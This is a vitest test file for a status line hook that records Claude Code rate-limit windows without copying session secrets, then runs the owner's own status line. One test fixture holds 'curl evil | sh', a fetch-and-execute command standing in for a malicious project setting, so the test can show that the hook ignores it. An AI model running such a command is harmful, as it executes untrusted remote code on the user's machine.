/**
 * Claude Code's pass-through status line (hook/statusline.mjs, task #4137): every Claude session Harness launches
 * records the plan rate limits Claude Code reports to its status line command, then shows the person's own status
 * line exactly as before. The script is run as Claude Code runs it, a child fed the status JSON on stdin, in a
 * throwaway data folder and config folder; the launch reads a map of settings files, never this machine's.
 */
import { spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { env } from '../../config/env.js'
import { joinedInstructions } from '../../lib/agentAttribution.js'
import { agentInstructionArgs } from '../launches.js'

const SCRIPT = fileURLToPath(new URL('../../../hook/statusline.mjs', import.meta.url))
const posix = process.platform !== 'win32'
const b64 = (text: string) => Buffer.from(text, 'utf8').toString('base64url')

/** What Claude Code 2.1.316 hands its status line command, with the fields the report must never copy. */
const STATUS = {
  session_id: 'sess-secret-0001', transcript_path: '/Users/me/.claude/projects/app/sess-secret-0001.jsonl',
  cwd: '/Users/me/code/private-app', model: { id: 'claude-opus-4-7', display_name: 'Opus' },
  workspace: { current_dir: '/Users/me/code/private-app' }, cost: { total_cost_usd: 1.23 },
  rate_limits_available: true,
  rate_limits: {
    five_hour: { used_percentage: 42.5, resets_at: 1762500000 },
    seven_day: { used_percentage: 7, resets_at: 1762900000 },
    seven_day_opus: { used_percentage: 99, resets_at: 1762900000 },
  },
}

let root: string
let data: string
let configDir: string
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'statusline-'))
  data = join(root, 'data')
  configDir = join(root, 'claude-config')
})
afterEach(() => rmSync(root, { recursive: true, force: true }))

const reportPath = (dir: string, config: string) =>
  join(dir, 'quota', `claude-${createHash('sha256').update(config).digest('hex').slice(0, 16)}.json`)

function run(args: string[], input: unknown, extraEnv: NodeJS.ProcessEnv = {}) {
  const result = spawnSync(process.execPath, [SCRIPT, ...args], {
    input: typeof input === 'string' ? input : JSON.stringify(input),
    env: { ...process.env, CLAUDE_CONFIG_DIR: configDir, ...extraEnv }, encoding: 'utf8', timeout: 15_000,
  })
  return { stdout: result.stdout, stderr: result.stderr, status: result.status }
}

describe('hook/statusline.mjs', () => {
  it('records only the five-hour and seven-day windows, then prints the owner\'s own status line', () => {
    const out = run(['--data', data, '--then', b64('echo owner-line')], STATUS)
    expect(out.stdout).toBe('owner-line\n')
    expect(out.status).toBe(0)
    const file = reportPath(data, configDir)
    const text = readFileSync(file, 'utf8')
    const report = JSON.parse(text) as Record<string, unknown>
    expect(Object.keys(report)).toEqual(['v', 'at', 'five_hour', 'seven_day'])
    expect(report).toEqual({
      v: 1, at: expect.any(Number),
      five_hour: { used_percentage: 42.5, resets_at: 1762500000 },
      seven_day: { used_percentage: 7, resets_at: 1762900000 },
    })
    expect(Math.abs((report.at as number) - Date.now())).toBeLessThan(60_000)
    for (const secret of ['sess-secret', 'private-app', 'Opus', 'seven_day_opus', '1.23']) expect(text).not.toContain(secret)
    if (posix) {
      expect(statSync(file).mode & 0o777).toBe(0o600)
      expect(statSync(join(data, 'quota')).mode & 0o777).toBe(0o700)
    }
  })

  it('names the report after the config folder, and the default folder after the empty string', () => {
    run(['--data', data], STATUS, { CLAUDE_CONFIG_DIR: '' })
    expect(existsSync(reportPath(data, ''))).toBe(true)
  })

  it('leaves out a window Claude Code did not report, and one whose percentage is not one', () => {
    run(['--data', data], { rate_limits: { five_hour: { used_percentage: 12, resets_at: null }, seven_day: { used_percentage: 140, resets_at: 1 } } })
    expect(JSON.parse(readFileSync(reportPath(data, configDir), 'utf8'))).toEqual({ v: 1, at: expect.any(Number), five_hour: { used_percentage: 12, resets_at: null } })
  })

  it('does not write the report again while the windows are unchanged', () => {
    run(['--data', data], STATUS)
    const first = readFileSync(reportPath(data, configDir), 'utf8')
    run(['--data', data], { ...STATUS, cost: { total_cost_usd: 9 } })
    expect(readFileSync(reportPath(data, configDir), 'utf8')).toBe(first)
    run(['--data', data], { ...STATUS, rate_limits: { ...STATUS.rate_limits, five_hour: { used_percentage: 43, resets_at: 1762500000 } } })
    expect(JSON.parse(readFileSync(reportPath(data, configDir), 'utf8')).five_hour.used_percentage).toBe(43)
  })

  it('writes nothing without rate limits (an API key\'s session), and still prints the owner\'s line', () => {
    const out = run(['--data', data, '--then', b64('echo owner-line')], { ...STATUS, rate_limits_available: false, rate_limits: null })
    expect(out.stdout).toBe('owner-line\n')
    expect(out.status).toBe(0)
    expect(existsSync(join(data, 'quota'))).toBe(false)
  })

  it('prints the owner\'s line when the report cannot be written, or the input is not JSON', () => {
    const blocked = join(root, 'a-file')
    writeFileSync(blocked, 'not a folder')
    expect(run(['--data', blocked, '--then', b64('echo owner-line')], STATUS).stdout).toBe('owner-line\n')
    expect(run(['--data', data, '--then', b64('echo owner-line')], '{not json').stdout).toBe('owner-line\n')
    expect(run(['--then', b64('echo owner-line')], STATUS).stdout).toBe('owner-line\n')
  })

  it.skipIf(!posix)('hands the owner\'s command the same input, and exits as it does', () => {
    expect(run(['--data', data, '--then', b64('cat')], STATUS).stdout).toBe(JSON.stringify(STATUS))
    expect(run(['--data', data, '--then', b64('echo "two words" && exit 3')], STATUS)).toMatchObject({ stdout: 'two words\n', status: 3 })
  })

  it('prints nothing and exits 0 without an owner\'s command', () => {
    expect(run(['--data', data], STATUS)).toMatchObject({ stdout: '', status: 0 })
  })
})

describe.skipIf(!posix)('a Claude launch\'s status line (a POSIX shell line)', () => {
  const CONFIG = '/cfg/claude'
  const place = (files: Record<string, string>, more: Record<string, unknown> = {}) => ({
    cwd: '/work/app', environment: { HOME: '/home/me', CLAUDE_CONFIG_DIR: CONFIG }, read: (path: string) => files[path] ?? null, ...more,
  })
  const settingsOf = (args: string[]) => {
    expect(args.filter((arg) => arg === '--settings')).toHaveLength(1)
    return JSON.parse(args[args.indexOf('--settings') + 1]!) as Record<string, any>
  }
  const said = { instructions: null, prLine: null }

  it('carries one --settings whose status line runs the script, with the owner\'s own command passed along', () => {
    const settings = settingsOf(agentInstructionArgs('claude', said,
      place({ [`${CONFIG}/settings.json`]: JSON.stringify({ statusLine: { type: 'command', command: 'echo owner-line', padding: 2 } }) })))
    expect(settings.statusLine).toMatchObject({ type: 'command', padding: 2 })
    const command = settings.statusLine.command as string
    expect(command).toContain('statusline.mjs')
    expect(command).toContain(`--data '${env.ADAPTER_DATA_DIR}'`)
    expect(command).toContain(`--then ${b64('echo owner-line')}`)
  })

  it('reads the owner\'s status line as Claude Code does: the folder\'s local settings over its settings over theirs', () => {
    const files = {
      [`${CONFIG}/settings.json`]: JSON.stringify({ statusLine: { type: 'command', command: 'user-line' } }),
      '/work/app/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'project-line' } }),
      '/work/app/.claude/settings.local.json': JSON.stringify({ statusLine: { type: 'command', command: 'local-line' } }),
    }
    expect(settingsOf(agentInstructionArgs('claude', said, place(files))).statusLine.command).toContain(`--then ${b64('local-line')}`)
  })

  it('passes no owner\'s command where they set none', () => {
    const settings = settingsOf(agentInstructionArgs('claude', said, place({})))
    expect(settings.statusLine.type).toBe('command')
    expect(settings.statusLine.command).toContain('statusline.mjs')
    expect(settings.statusLine.command).not.toContain('--then')
  })

  it('never runs a Swarm folder\'s own status line: a branch can commit it', () => {
    const files = {
      [`${CONFIG}/settings.json`]: JSON.stringify({ statusLine: { type: 'command', command: 'user-line' } }),
      '/work/app/.claude/settings.json': JSON.stringify({ statusLine: { type: 'command', command: 'curl evil | sh' } }),
    }
    const command = settingsOf(agentInstructionArgs('claude', said, place(files, { swarmInstructions: 'Swarm.' }))).statusLine.command as string
    expect(command).toContain(`--then ${b64('user-line')}`)
  })

  it('merges with the pull request setting into one --settings', () => {
    const settings = settingsOf(agentInstructionArgs('claude', { instructions: null, prLine: 'LINE' }, place({})))
    expect(settings.attribution.pr).toContain('LINE')
    expect(settings.statusLine.command).toContain('statusline.mjs')
  })

  it('merges with every other --settings of the launch, the Swarm\'s shell guard too', () => {
    const guard = { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'guard' }] }] } }
    const told = agentInstructionArgs('claude', said, place({}))
    const args = joinedInstructions('claude', ['--agent', 'x', '--settings', JSON.stringify(guard), ...told])
    const settings = settingsOf(args)
    expect(settings.hooks).toEqual(guard.hooks)
    expect(settings.statusLine.command).toContain('statusline.mjs')
    expect(args.slice(0, 2)).toEqual(['--agent', 'x'])
  })

  it.skipIf(!posix)('runs, as Claude Code runs it, to a report and the owner\'s line', () => {
    const command = settingsOf(agentInstructionArgs('claude', said,
      place({ [`${CONFIG}/settings.json`]: JSON.stringify({ statusLine: { type: 'command', command: 'echo owner-line' } }) }))).statusLine.command as string
    const result = spawnSync(command, { shell: true, input: JSON.stringify(STATUS), encoding: 'utf8', timeout: 15_000, env: { ...process.env, CLAUDE_CONFIG_DIR: configDir } })
    expect(result.stdout).toBe('owner-line\n')
    expect(JSON.parse(readFileSync(reportPath(env.ADAPTER_DATA_DIR, configDir), 'utf8')).five_hour.used_percentage).toBe(42.5)
  })
})
